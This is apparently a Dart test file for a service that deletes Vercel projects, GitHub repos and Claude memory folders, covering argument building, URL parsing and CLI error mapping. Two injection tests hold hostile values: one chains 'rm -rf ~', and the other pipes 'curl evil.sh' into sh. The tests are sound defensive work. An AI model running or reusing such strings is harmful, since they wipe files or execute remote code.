import 'dart:io';

import 'package:test/test.dart';

import 'package:pro_orc/data/models/deletion_result.dart';
import 'package:pro_orc/data/services/external_deletion_service.dart';

/// A [ProcessRunner] that returns a fixed, injected result — no real
/// process is spawned, so `deleteGh` tests are deterministic and never
/// depend on the machine's actual `gh` login state.
ProcessRunner fakeRunner({required int exitCode, String stderr = ''}) {
  return (
    String executable,
    List<String> arguments, {
    bool runInShell = true,
  }) async {
    return ProcessResult(0, exitCode, '', stderr);
  };
}

void main() {
  group('buildVercelDeleteArgs', () {
    test('builds the exact expected argument list', () {
      final args = buildVercelDeleteArgs('my-project');

      expect(args, ['project', 'remove', 'my-project', '--yes']);
    });

    test('a project name containing shell metacharacters is passed as a '
        'single discrete argument and cannot break out or chain a command', () {
      const malicious = 'my-project; rm -rf ~ && echo "\$(whoami)" `id`';

      final args = buildVercelDeleteArgs(malicious);

      // The dangerous value must appear as exactly ONE list element,
      // never split, concatenated, or exposed as a raw shell string. As
      // long as it stays a single element passed via Process.run's args
      // list (not runInShell string interpolation), the shell never
      // parses its metacharacters.
      expect(args, ['project', 'remove', malicious, '--yes']);
      expect(args.length, 4);
      expect(args, isNot(contains(';')));
      expect(args, isNot(contains('rm')));
    });
  });

  group('buildGhDeleteArgs', () {
    test('builds the exact expected argument list', () {
      final args = buildGhDeleteArgs('owner/repo');

      expect(args, ['repo', 'delete', 'owner/repo', '--yes']);
    });

    test('an owner/repo value containing shell metacharacters is passed as a '
        'single discrete argument and cannot break out or chain a command', () {
      const malicious = 'owner/repo\$(curl evil.sh | sh)`touch /tmp/pwn`';

      final args = buildGhDeleteArgs(malicious);

      expect(args, ['repo', 'delete', malicious, '--yes']);
      expect(args.length, 4);
    });
  });

  group('deriveVercelProjectName', () {
    test('derives the last path segment from a dashboard URL', () {
      final name = deriveVercelProjectName(
        'https://vercel.com/my-scope/my-project',
      );

      expect(name, 'my-project');
    });

    test('derives the last path segment from a nested dashboard URL', () {
      final name = deriveVercelProjectName(
        'https://vercel.com/my-scope/my-project/deployments',
      );

      expect(name, 'deployments');
    });

    test('returns null for a *.vercel.app deployment URL', () {
      final name = deriveVercelProjectName(
        'https://my-app-abc123xyz.vercel.app',
      );

      expect(name, isNull);
    });

    test('returns null for the bare vercel.app host', () {
      final name = deriveVercelProjectName('https://vercel.app');

      expect(name, isNull);
    });

    test('returns null for a non-vercel URL', () {
      final name = deriveVercelProjectName('https://example.com/foo/bar');

      expect(name, isNull);
    });

    test('returns null for an unparsable URL', () {
      final name = deriveVercelProjectName('not a url at all ::::');

      expect(name, isNull);
    });

    test('returns null when the dashboard URL has no path segments', () {
      final name = deriveVercelProjectName('https://vercel.com');

      expect(name, isNull);
    });
  });

  group('deriveGhOwnerRepo', () {
    test('derives owner/repo from a GitHub URL', () {
      final ownerRepo = deriveGhOwnerRepo(
        'https://github.com/n3urala1-rob/a1-pro-orc',
      );

      expect(ownerRepo, 'n3urala1-rob/a1-pro-orc');
    });

    test('ignores extra path segments beyond owner/repo', () {
      final ownerRepo = deriveGhOwnerRepo(
        'https://github.com/n3urala1-rob/a1-pro-orc/issues/5',
      );

      expect(ownerRepo, 'n3urala1-rob/a1-pro-orc');
    });

    test('returns null when only owner is present (no repo segment)', () {
      final ownerRepo = deriveGhOwnerRepo('https://github.com/n3urala1-rob');

      expect(ownerRepo, isNull);
    });

    test('returns null for a non-github URL', () {
      final ownerRepo = deriveGhOwnerRepo('https://example.com/a/b');

      expect(ownerRepo, isNull);
    });

    test('returns null for an unparsable URL', () {
      final ownerRepo = deriveGhOwnerRepo('not a url at all ::::');

      expect(ownerRepo, isNull);
    });
  });

  group('deleteGh', () {
    test('exit 0 returns DeletionResult.success', () async {
      final result = await deleteGh(
        'https://github.com/owner/repo',
        'owner/repo',
        runner: fakeRunner(exitCode: 0),
      );

      expect(result.succeeded, isTrue);
      expect(result.outcome, DeletionOutcome.success);
    });

    test('a missing delete_repo scope maps to missingScope with the refresh '
        'hint, DISTINCT from notAuthenticated (FR-009)', () async {
      final result = await deleteGh(
        'https://github.com/owner/repo',
        'owner/repo',
        runner: fakeRunner(
          exitCode: 1,
          stderr:
              'HTTP 404: Not Found\n'
              'This API operation needs the "delete_repo" scope. To '
              'request it, run: gh auth refresh -h github.com -s delete_repo',
        ),
      );

      expect(result.succeeded, isFalse);
      expect(result.outcome, DeletionOutcome.missingScope);
      expect(result.reason, contains('gh auth refresh -s delete_repo'));
    });

    test('a scope error is classified as missingScope even though the same '
        'stderr also contains a 404/not-found message — the scope check '
        'takes priority so a permission problem is never misreported as '
        'already-deleted success (matches the real installed gh CLI '
        'behavior for an unscoped token)', () async {
      final result = await deleteGh(
        'https://github.com/owner/repo',
        'owner/repo',
        runner: fakeRunner(
          exitCode: 1,
          stderr:
              'HTTP 404: Not Found (https://api.github.com/repos/owner/repo)\n'
              'This API operation needs the "delete_repo" scope. To '
              'request it, run: gh auth refresh -h github.com -s delete_repo',
        ),
      );

      expect(result.outcome, DeletionOutcome.missingScope);
      expect(result.outcome, isNot(DeletionOutcome.alreadyDeleted));
    });

    test('a genuine not-found error (no scope message) maps to alreadyDeleted '
        'success, labelled "war bereits geloescht" (FR-017)', () async {
      final result = await deleteGh(
        'https://github.com/owner/repo',
        'owner/repo',
        runner: fakeRunner(
          exitCode: 1,
          stderr:
              'GraphQL: Could not resolve to a Repository (repository) (Not Found)',
        ),
      );

      expect(result.succeeded, isTrue);
      expect(result.outcome, DeletionOutcome.alreadyDeleted);
      expect(result.reason, 'war bereits geloescht');
    });

    test('a plain auth failure maps to notAuthenticated, with reason text '
        'DISTINCT from the missingScope reason (FR-009)', () async {
      final result = await deleteGh(
        'https://github.com/owner/repo',
        'owner/repo',
        runner: fakeRunner(
          exitCode: 1,
          stderr: 'You are not logged into any GitHub hosts.',
        ),
      );

      expect(result.succeeded, isFalse);
      expect(result.outcome, DeletionOutcome.notAuthenticated);
      expect(result.reason, isNot(contains('delete_repo')));
    });

    test(
      'an unrecognized failure maps to genericFailure with a stderr gist',
      () async {
        final result = await deleteGh(
          'https://github.com/owner/repo',
          'owner/repo',
          runner: fakeRunner(
            exitCode: 1,
            stderr: 'some unexpected server error',
          ),
        );

        expect(result.succeeded, isFalse);
        expect(result.outcome, DeletionOutcome.genericFailure);
        expect(result.reason, contains('some unexpected server error'));
      },
    );

    test(
      'a runner that throws is caught and mapped to genericFailure',
      () async {
        Future<ProcessResult> throwingRunner(
          String executable,
          List<String> arguments, {
          bool runInShell = true,
        }) async {
          throw Exception('process spawn failed');
        }

        final result = await deleteGh(
          'https://github.com/owner/repo',
          'owner/repo',
          runner: throwingRunner,
        );

        expect(result.succeeded, isFalse);
        expect(result.outcome, DeletionOutcome.genericFailure);
      },
    );
  });

  group('deleteClaudeMemory', () {
    late Directory tmp;

    setUp(() async {
      tmp = await Directory.systemTemp.createTemp('delete_claude_memory_test_');
    });

    tearDown(() async {
      if (await tmp.exists()) await tmp.delete(recursive: true);
    });

    test(
      'deletes an existing directory from disk and returns success',
      () async {
        final memDir = Directory('${tmp.path}/claude_project');
        await memDir.create();
        await File('${memDir.path}/MEMORY.md').writeAsString('# notes');

        final result = await deleteClaudeMemory(memDir.path, memDir.path);

        expect(result.succeeded, isTrue);
        expect(result.outcome, DeletionOutcome.success);
        expect(await memDir.exists(), isFalse);
      },
    );

    test('a directory that does not exist maps to alreadyDeleted success '
        '(FR-017 idempotency), not a failure', () async {
      final missingDir = '${tmp.path}/never_existed';

      final result = await deleteClaudeMemory(missingDir, missingDir);

      expect(result.succeeded, isTrue);
      expect(result.outcome, DeletionOutcome.alreadyDeleted);
      expect(result.reason, 'war bereits geloescht');
    });
  });
}
